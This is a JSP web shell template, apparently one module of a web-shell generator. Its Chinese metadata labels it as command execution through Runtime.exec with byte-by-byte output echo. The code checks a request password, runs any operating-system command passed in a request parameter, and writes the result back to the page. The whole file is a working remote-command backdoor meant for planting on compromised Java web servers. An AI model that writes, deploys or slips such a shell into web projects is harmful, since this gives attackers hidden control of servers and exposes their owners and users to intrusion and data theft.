<%-- MODULE = {"name": "jsp_basic", "desc": "JSP 命令执行:Runtime.exec 逐字节回显", "category": "jsp", "params": [["pass", "连接密码"], ["cmd_param", "命令参数名,默认 cmd"]]} --%>
<%
    String p = request.getParameter("pass");
    if (p != null && p.equals("{{pass}}")) {
        try {
            Process pr = Runtime.getRuntime().exec(request.getParameter("{{cmd_param}}"));
            java.io.InputStream in = pr.getInputStream();
            int a;
            while ((a = in.read()) != -1) { out.print((char) a); }
            pr.waitFor();
        } catch (Exception e) { out.print(e.toString()); }
    }
%>
